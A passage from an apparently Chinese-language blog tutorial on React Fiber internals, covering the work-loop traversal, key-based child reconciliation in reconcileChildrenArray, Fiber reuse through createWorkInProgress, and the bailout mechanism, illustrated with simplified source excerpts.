&#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">completeWork</span>(current, completedWork, entangledRenderLanes);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (enableProfilerTimer &amp;&amp; (completedWork.<span class="hljs-property">mode</span> &amp; <span class="hljs-title class_">ProfileMode</span>) !== <span class="hljs-title class_">NoMode</span>) &#123;<br>      <span class="hljs-comment">// Update render duration assuming we didn&#x27;t error.</span><br>      <span class="hljs-title function_">stopProfilerTimerIfRunningAndRecordIncompleteDuration</span>(completedWork);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (next !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// Completing this fiber spawned new work. Work on that next.</span><br>      workInProgress = next;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> siblingFiber = completedWork.<span class="hljs-property">sibling</span>;<br>    <span class="hljs-keyword">if</span> (siblingFiber !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// If there is more work to do in this returnFiber, do that next.</span><br>      workInProgress = siblingFiber;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// Otherwise, return to the parent</span><br>    <span class="hljs-comment">// $FlowFixMe[incompatible-type] we bail out when we get a null</span><br>    completedWork = returnFiber;<br>    <span class="hljs-comment">// Update the next thing we&#x27;re working on in case something throws.</span><br>    workInProgress = completedWork;<br>  &#125; <span class="hljs-keyword">while</span> (completedWork !== <span class="hljs-literal">null</span>);<br><br>  <span class="hljs-comment">// We&#x27;ve reached the root.</span><br>  <span class="hljs-keyword">if</span> (workInProgressRootExitStatus === <span class="hljs-title class_">RootInProgress</span>) &#123;<br>    workInProgressRootExitStatus = <span class="hljs-title class_">RootCompleted</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>核心操作：</p><ul><li>DOM 准备：在 completeWork 中创建&#x2F;更新 DOM</li><li>副作用收集：通过 firstEffect&#x2F;lastEffect构建线性副作用链表，供提交阶段批量处理</li><li>回溯机制：通过 return 指针实现非递归遍历</li></ul><p><strong>遍历过程图解</strong></p><p>还是以之前的组件树为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;App&gt;<br>  &lt;Header /&gt;<br>  &lt;Content&gt;<br>    &lt;Sidebar /&gt;<br>    &lt;Main /&gt;<br>  &lt;/Content&gt;<br>&lt;/App&gt;<br></code></pre></td></tr></table></figure><p>其链表遍历顺序图：</p><pre class="mermaid">graph LR    A[App] --> B[Header]    B --> C[Content]    C --> D[Sidebar]    D --> E[Main]    E --> F[回溯Content]    F --> G[回溯App]</pre><p>具体步骤：</p><ol><li>performUnitOfWork(App) -&gt; beginWork(App) -&gt; 返回子节点 Header -&gt; workInProgress &#x3D; Header</li><li>workLoopSync -&gt; performUnitOfWork(Header) -&gt; beginWork(Header) -&gt; 无子节点，返回null</li><li>completeUnitOfWork(Header) -&gt; workInProgress &#x3D; Header.siblingFiber(即Content)</li><li>performUnitOfWork(Content) -&gt; beginWork(Content) -&gt; 返回子节点 Sidebar -&gt; workInProgress &#x3D; Sidebar</li><li>workLoopSync -&gt; performUnitOfWork(Sidebar) -&gt; beginWork(Sidebar) -&gt; 无子节点，返回null</li><li>completeUnitOfWork(Sidebar) -&gt; workInProgress &#x3D; Sidebar.siblingFiber(即Main)</li><li>performUnitOfWork(Main) -&gt; beginWork(Main) -&gt; 无子节点无兄弟节点，返回 null</li><li>completeUnitOfWork(Main) -&gt; 无子节点，无兄弟节点 -&gt; return 回溯到 Content -&gt; 无兄弟节点 -&gt; completeUnitOfWork(Content) -&gt; return 回溯到 App -&gt; 遍历结束</li></ol><p><strong>performUnitOfWork 的完整工作流程</strong></p><pre class="mermaid">sequenceDiagram    participant Scheduler    participant performUnitOfWork    participant beginWork    participant completeUnitOfWork    Scheduler->>performUnitOfWork: 分配任务（Fiber节点）    performUnitOfWork->>beginWork: 处理当前节点    alt 有子节点        beginWork-->>performUnitOfWork: 返回子节点    else 无子节点        beginWork-->>performUnitOfWork: null        performUnitOfWork->>completeUnitOfWork: 进入完成阶段        completeUnitOfWork-->>performUnitOfWork: 返回兄弟/父节点    end    performUnitOfWork-->>Scheduler: 返回下一个节点</pre><h2 id="3-3-Diff算法的Fiber化改造"><a href="#3-3-Diff算法的Fiber化改造" class="headerlink" title="3.3 Diff算法的Fiber化改造"></a>3.3 Diff算法的Fiber化改造</h2><h3 id="同级比较（Key优化）在Fiber中的实现"><a href="#同级比较（Key优化）在Fiber中的实现" class="headerlink" title="同级比较（Key优化）在Fiber中的实现"></a>同级比较（Key优化）在Fiber中的实现</h3><p>React 列表元素为什么要加上 key 属性？</p><p>无论是传统 Diff 还是 Fiber Diff，key 的核心作用都是<code>唯一标识同级元素</code>。传统虚拟 DOM Diff 在 key 的利用上有两个瓶颈：</p><p><strong>双指针遍历算法（O(n²) 复杂度）</strong></p><p>传统 Diff 通过两层循环匹配新旧节点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i =<span class="hljs-number">0</span>; i &lt; newChildren.<span class="hljs-property">length</span>; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j =<span class="hljs-number">0</span>; j &lt; oldChildren.<span class="hljs-property">length</span>; j++) &#123;<br>    <span class="hljs-keyword">if</span> (newChild[i].<span class="hljs-property">key</span> === oldChild[j].<span class="hljs-property">key</span>) &#123;<br>      <span class="hljs-comment">// 匹配成功，复用节点</span><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这带来的问题是：</p><ul><li>长度为 n 的列表最坏情况下需要 n² 次比较，性能随列表长度增大急剧下降</li><li>仅能通过位置索引猜测节点移动，容易产生冗余 DOM 操作</li></ul><p><strong>复用粒度有限</strong></p><ul><li>仅能复用虚拟 DOM 节点对象，仍需执行组件的生命周期和 DOM 属性对比</li><li>无法跳过状态未发生改变的组件渲染（比如 shouldComponentUpdate 需手动优化）</li></ul><p>Fiber 架构对比传统虚拟 DOM Diff 在 key 的利用上实现了质的飞跃。</p><p>在 Fiber 架构中，同级比较的核心逻辑集中在 <code>reconcileChildren</code> 函数中，它负责对比新旧子节点并生成新的 Fiber 树。beginWork 函数根据组件类型执行对应处理时触发该函数。</p><p><strong>入口函数：reconcileChildren</strong></p><p>根据当前是首次渲染还是更新调用 mountChildFibers 或 reconcileChildFibers</p><ul><li>mountChildFibers：</li><li>reconcileChildFibers：处理子节点协调的核心逻辑，根据子节点类型做不同处理，比如子节点为数组时调用 <code>reconcileChildrenArray</code> 函数处理。</li></ul><p><strong>核心优化逻辑</strong></p><p>reconcileChildrenArray 采用多阶段遍历 + key 映射表的策略，将时间复杂度优化至O(n)，主要优化包括:</p><ul><li>两轮遍历：先尝试从左到右顺序匹配，再处理移动&#x2F;新增&#x2F;删除</li><li>key 映射：剩余未匹配的旧节点存入map，实现O(1)查找</li><li>节点复用：通过 key 和 type 精确匹配可复用的 Fiber 节点</li><li>最小化 DOM 操作：仅标记需要移动和删除的节点</li></ul><p><strong>源码解析：以 reconcileChildrenArray 为例</strong></p><p>阶段一：顺序遍历匹配（从左到右）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> oldFiber = currentFirstChild; <span class="hljs-comment">// 旧 Fiber 链表头节点</span><br><span class="hljs-keyword">let</span> lastPlacedIndex = <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录最后一个无需移动的节点索引</span><br><span class="hljs-keyword">let</span> newIdx = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">let</span> nextOldFiber = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 第一轮遍历：顺序匹配 key 相同的节点</span><br><span class="hljs-keyword">for</span> (; oldFiber !== <span class="hljs-literal">null</span> &amp;&amp; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>  <span class="hljs-keyword">if</span> (oldFiber.<span class="hljs-property">index</span> &gt; newIdx) &#123;<br>    nextOldFiber = oldFiber;<br>    oldFiber = <span class="hljs-literal">null</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    nextOldFiber = oldFiber.<span class="hljs-property">sibling</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 尝试复用旧 Fiber（key &amp; type 匹配）</span><br>  <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">updateSlot</span>(returnFiber, oldFiber, newChildren[newIdx], lanes);<br><br>  <span class="hljs-keyword">if</span> (newFiber === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// key 不匹配，跳出循环</span><br>    <span class="hljs-keyword">break</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 标记是否需要移动</span><br>  lastPlacedIndex = <span class="hljs-title function_">placeChild</span>(newFiber, lastPlacedIndex, newIdx);<br>&#125;<br></code></pre></td></tr></table></figure><p>优化点：</p><ul><li>updateSlot：检查 key 和 type，匹配则复用旧 Fiber，否则返回null</li><li>placeChild：比较旧 Fiber 的 index 和 newIdx，决定是否标记 placement（移动）</li></ul><p>阶段二：处理剩余节点<br>情况一：新节点已遍历完</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (newIdx === newChildren.<span class="hljs-property">length</span>) &#123;<br>  <span class="hljs-comment">// 删除剩余旧节点</span><br>  <span class="hljs-title function_">deleteRemainingChildren</span>(returnFiber, oldFiber);<br>  <span class="hljs-keyword">return</span> resultingFirstChild;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化点：直接删除未匹配的旧节点，无需进一步比较</p><p>情况二：旧节点已遍历完</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (oldFiber === <span class="hljs-literal">null</span>) &#123;<br>  <span class="hljs-comment">// 创建剩余新节点</span><br>  <span class="hljs-keyword">for</span> (; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>    <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">createChild</span>(returnFiber, newChildren[newIdx], lanes);<br>    <span class="hljs-comment">// 链接到链表</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> resultingFirstChild;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化点：剩余新节点直接创建，无需匹配</p><p>情况三：新旧节点均未遍历完</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 构建旧节点 Map&lt;key|index, Fiber&gt;</span><br><span class="hljs-keyword">const</span> existingChildren = <span class="hljs-title function_">mapRemainingChildren</span>(oldFiber);<br><br><span class="hljs-comment">// 遍历剩余新节点，尝试从 Map 中匹配</span><br><span class="hljs-keyword">for</span> (; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>  <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">updateFromMap</span>(<br>    existingChildren,<br>    returnFiber,<br>    newIdx,<br>    newChildren[newIdx],<br>    lanes,<br>  );<br><br>  <span class="hljs-keyword">if</span> (newFiber !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// 标记移动或复用</span><br>    lastPlacedIndex = <span class="hljs-title function_">placeChild</span>(newFiber, lastPlacedIndex, newIdx);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 删除未匹配的旧节点</span><br>existingChildren.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-title function_">deleteChild</span>(returnFiber, child));<br></code></pre></td></tr></table></figure><p>优化点：</p><ul><li>mapRemainingChildren：将剩余旧节点存入 map，key 优先，无 key 时使用 index</li><li>updateFromMap：从 map 中查找可复用节点，减少遍历次数</li><li>placeChild：仅对需要移动的节点标记 placement，减少不必要的 DOM 操作</li></ul><p><strong>key的核心作用</strong></p><ol><li>精确匹配：key 是 React 中节点的唯一标识，应避免复用</li><li>高效复用：通过 key 直接定位旧节点，而非递归比较</li><li>移动优化：key 相同的节点即使位置发生改变，也能被正确标记移动，而非删除重建</li></ol><p><strong>性能对比（传统虚拟 DOM Diff 对比 Fiber Diff）</strong></p><table><thead><tr><th align="left">场景</th><th align="left">传统 Diff</th><th align="left">Fiber Diff</th></tr></thead><tbody><tr><td align="left">时间复杂度</td><td align="left">O(n²)(双指针循环)</td><td align="left">O(n) (map查找)</td></tr><tr><td align="left">DOM 操作</td><td align="left">可能多次移动&#x2F;重建</td><td align="left">仅进行必要更新（placement&#x2F;deletion）</td></tr><tr><td align="left">状态保留</td><td align="left">仅复用 DOM</td><td align="left">组件状态、hooks、ref全保留</td></tr><tr><td align="left">列表渲染</td><td align="left">性能随列表长度下降明显</td><td align="left">万级列表仍然流畅</td></tr></tbody></table><h3 id="节点复用策略与bailout机制"><a href="#节点复用策略与bailout机制" class="headerlink" title="节点复用策略与bailout机制"></a>节点复用策略与bailout机制</h3><p><strong>复用条件：key 和 type 双匹配</strong></p><p>源码入口：reconcileChildFibers -&gt; reconcileChildrenArray &#x2F; updateSlot<br>核心代码逻辑（简化自ReactFiberChild.js）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateSlot</span>(<span class="hljs-params">returnFiber: Fiber, oldFiber: Fiber | <span class="hljs-literal">null</span>, newChild: any, lanes: Lanes</span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-comment">// Update the fiber if the keys match, otherwise return null.</span><br>  <span class="hljs-keyword">const</span> key = oldFiber !== <span class="hljs-literal">null</span> ? oldFiber.<span class="hljs-property">key</span> : <span class="hljs-literal">null</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newChild === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; newChild !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (newChild.<span class="hljs-property">key</span> === key) &#123;<br>      <span class="hljs-keyword">if</span> (newChild.<span class="hljs-property">type</span> === oldFiber?.<span class="hljs-property">type</span>) &#123;<br>        <span class="hljs-comment">// 复用旧 Fiber（保留 state/DOM/hooks）</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">useFiber</span>(oldFiber, newChild.<span class="hljs-property">props</span>);<br>      &#125;<br>      <span class="hljs-comment">// key 匹配但 type 不匹配，销毁旧节点</span><br>      <span class="hljs-title function_">deleteChild</span>(returnFiber, oldFiber);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 不匹配则创建新节点</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>复用规则</strong></p><ul><li>key 和 type 都相同：调用 useFiber 克隆旧节点，保留：<ul><li>组件实例（class组件）和 hooks 链表（函数式组件）</li><li>DOM 引用（避免重建）</li><li>状态和refs</li></ul></li><li>key 相同，type 不同：销毁旧节点（标记deletion），创建新节点</li><li>key 不同：直接创建新节点</li></ul><p><strong>useFiber实现（状态保留核心）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useFiber</span>(<span class="hljs-params">fiber: Fiber, pendingProps: mixed</span>): <span class="hljs-title class_">Fiber</span> &#123;<br>  <span class="hljs-comment">// We currently set sibling to null and index to 0 here because it is easy</span><br>  <span class="hljs-comment">// to forget to do before returning it. E.g. for the single child case.</span><br>  <span class="hljs-keyword">const</span> clone = <span class="hljs-title function_">createWorkInProgress</span>(fiber, pendingProps);<br>  clone.<span class="hljs-property">index</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// 重置索引</span><br>  clone.<span class="hljs-property">sibling</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 断开兄弟链接</span><br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createWorkInProgress</span>(<span class="hljs-params">current: Fiber, pendingProps: any</span>): <span class="hljs-title class_">Fiber</span> &#123;<br>  <span class="hljs-keyword">let</span> workInProgress = current.<span class="hljs-property">alternate</span>;<br>  <span class="hljs-keyword">if</span> (workInProgress === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// We use a double buffering pooling technique because we know that we&#x27;ll</span><br>    <span class="hljs-comment">// only ever need at most two versions of a tree. We pool the &quot;other&quot; unused</span><br>    <span class="hljs-comment">// node that we&#x27;re free to reuse. This is lazily created to avoid allocating</span><br>    <span class="hljs-comment">// extra objects for things that are never updated. It also allow us to</span><br>    <span class="hljs-comment">// reclaim the extra memory if needed.</span><br>    workInProgress = <span class="hljs-title function_">createFiber</span>(<br>      current.<span class="hljs-property">tag</span>,<br>      pendingProps,<br>      current.<span class="hljs-property">key</span>,<br>      current.<span class="hljs-property">mode</span>,<br>    );<br>    workInProgress.<span class="hljs-property">elementType</span> = current.<span class="hljs-property">elementType</span>;<br>    workInProgress.<span class="hljs-property">type</span> = current.<span class="hljs-property">type</span>;<br>    workInProgress.<span class="hljs-property">stateNode</span> = current.<span class="hljs-property">stateNode</span>;<br><br>    <span class="hljs-comment">// 省略部分源码</span><br><br>    workInProgress.<span class="hljs-property">alternate</span> = current;<br>    current.<span class="hljs-property">alternate</span> = workInProgress;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress.<span class="hljs-property">pendingProps</span> = pendingProps;<br>    <span class="hljs-comment">// Needed because Blocks store data on type.</span><br>    workInProgress.<span class="hljs-property">type</span> = current.<span class="hljs-property">type</span>;<br><br>    <span class="hljs-comment">// We already have an alternate.</span><br>    <span class="hljs-comment">// Reset the effect tag.</span><br>    workInProgress.<span class="hljs-property">flags</span> = <span class="hljs-title class_">NoFlags</span>;<br><br>    <span class="hljs-comment">// The effects are no longer valid.</span><br>    workInProgress.<span class="hljs-property">subtreeFlags</span> = <span class="hljs-title class_">NoFlags</span>;<br>    workInProgress.<span class="hljs-property">deletions</span> = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>      <span class="hljs-comment">// We intentionally reset, rather than copy, actualDuration &amp; actualStartTime.</span><br>      <span class="hljs-comment">// This prevents time from endlessly accumulating in new commits.</span><br>      <span class="hljs-comment">// This has the downside of resetting values for different priority renders,</span><br>      <span class="hljs-comment">// But works for yielding (the common case) and should support resuming.</span><br>      workInProgress.<span class="hljs-property">actualDuration</span> = -<span class="hljs-number">0</span>;<br>      workInProgress.<span class="hljs-property">actualStartTime</span> = -<span class="hljs-number">1.1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// Reset all effects except static ones.</span><br>  <span class="hljs-comment">// Static effects are not specific to a render.</span><br>  workInProgress.<span class="hljs-property">flags</span> = current.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">StaticMask</span>;<br>  workInProgress.<span class="hljs-property">childLanes</span> = current.<span class="hljs-property">childLanes</span>;<br>  workInProgress.<span class="hljs-property">lanes</span> = current.<span class="hljs-property">lanes</span>;<br><br>  workInProgress.<span class="hljs-property">child</span> = current.<span class="hljs-property">child</span>;<br>  workInProgress.<span class="hljs-property">memoizedProps</span> = current.<span class="hljs-property">memoizedProps</span>;<br>  workInProgress.<span class="hljs-property">memoizedState</span> = current.<span class="hljs-property">memoizedState</span>;<br>  workInProgress.<span class="hljs-property">updateQueue</span> = current.<span class="hljs-property">updateQueue</span>;<br><br>  <span class="hljs-comment">// Clone the dependencies object. This is mutated during the render phase, so</span><br>  <span class="hljs-comment">// it cannot be shared with the current fiber.</span><br>  <span class="hljs-keyword">const</span> currentDependencies = current.<span class="hljs-property">dependencies</span>;<br>  workInProgress.<span class="hljs-property">dependencies</span> =<br>    currentDependencies === <span class="hljs-literal">null</span><br>      ? <span class="hljs-literal">null</span><br>      : __DEV__<br>        ? &#123;<br>            <span class="hljs-attr">lanes</span>: currentDependencies.<span class="hljs-property">lanes</span>,<br>            <span class="hljs-attr">firstContext</span>: currentDependencies.<span class="hljs-property">firstContext</span>,<br>            <span class="hljs-attr">_debugThenableState</span>: currentDependencies.<span class="hljs-property">_debugThenableState</span>,<br>          &#125;<br>        : &#123;<br>            <span class="hljs-attr">lanes</span>: currentDependencies.<span class="hljs-property">lanes</span>,<br>            <span class="hljs-attr">firstContext</span>: currentDependencies.<span class="hljs-property">firstContext</span>,<br>          &#125;;<br><br>  <span class="hljs-comment">// These will be overridden during the parent&#x27;s reconciliation</span><br>  workInProgress.<span class="hljs-property">sibling</span> = current.<span class="hljs-property">sibling</span>;<br>  workInProgress.<span class="hljs-property">index</span> = current.<span class="hljs-property">index</span>;<br>  workInProgress.<span class="hljs-property">ref</span> = current.<span class="hljs-property">ref</span>;<br>  workInProgress.<span class="hljs-property">refCleanup</span> = current.<span class="hljs-property">refCleanup</span>;<br><br>  <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>    workInProgress.<span class="hljs-property">selfBaseDuration</span> = current.<span class="hljs-property">selfBaseDuration</span>;<br>    workInProgress.<span class="hljs-property">treeBaseDuration</span> = current.<span class="hljs-property">treeBaseDuration</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 省略部分源码</span><br><br>  <span class="hljs-keyword">return</span> workInProgress;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键点：</p><ul><li>通过 alternate 指针复用旧 Fiber 对象（双缓冲技术）</li><li>保留 stateNode（DOM&#x2F;实例）和 memoizedState（状态）</li></ul><p><strong>bailout 机制（跳过子树协调）核心逻辑</strong></p><p>源码入口：beginWork -&gt; updateFunctionComponent &#x2F; updateClassComponent</p><p>核心代码逻辑（精简自ReactFiberBeginWork.js）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateFunctionComponent</span>(<span class="hljs-params"></span><br><span class="hljs-params">  current: <span class="hljs-literal">null</span> | Fiber,</span><br><span class="hljs-params">  workInProgress: Fiber,</span><br><span class="hljs-params">  Component: any,</span><br><span class="hljs-params">  nextProps: any,</span><br><span class="hljs-params">  renderLanes: Lanes,</span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> oldProps = current.<span class="hljs-property">memoizedProps</span>;<br>  <span class="hljs-keyword">const</span> newProps = workInProgress.<span class="hljs-property">pendingProps</span>;<br>  <span class="hljs-keyword">if</span> (<br>    oldProps === newProps &amp;&amp; <span class="hljs-comment">// Props 浅比较</span><br>    !<span class="hljs-title function_">hasLegacyContextChanged</span>() &amp;&amp; <span class="hljs-comment">// 旧 Context 未变</span><br>    workInProgress.<span class="hljs-property">type</span> === current.<span class="hljs-property">type</span> &amp;&amp; <span class="hljs-comment">// 组件类型相同</span><br>    !<span class="hljs-title function_">includesSomeLane</span>(renderLanes, current.<span class="hljs-property">lanes</span>) <span class="hljs-comment">// 无高优先级更新</span><br>  ) &#123;<br>    didReceiveUpdate = <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (current !== <span class="hljs-literal">null</span> &amp;&amp; !didReceiveUpdate) &#123;<br>    <span class="hljs-title function_">bailoutHooks</span>(current, workInProgress, renderLanes);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">bailoutOnAlreadyFinishedWork</span>(current, workInProgress, renderLanes);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">getIsHydrating</span>() &amp;&amp; hasId) &#123;<br>    <span class="hljs-title function_">pushMaterializedTreeId</span>(workInProgress);<br>  &#125;<br><br>  <span class="hljs-comment">// React DevTools reads this flag.</span><br>  workInProgress.<span class="hljs-property">flags</span> |= <span class="hljs-title class_">PerformedWork</span>;<br>  <span class="hljs-title function_">reconcileChildren</span>(current, workInProgress, nextChildren, renderLanes);<br>  <span class="hljs-keyword">return</span> workInProgress.<span class="hljs-property">child</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>bailout 条件</strong></p><ul><li>props 浅层相等（Object.is比较）</li><li>context 值未变化（新旧 Provider 值浅比较）。</li><li>组件类型相同（无 type 变化）。</li><li>无更高优先级更新（通过 lanes 模型判断）</li></ul><p><strong>bailoutOnAlreadyFinishedWork 实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span 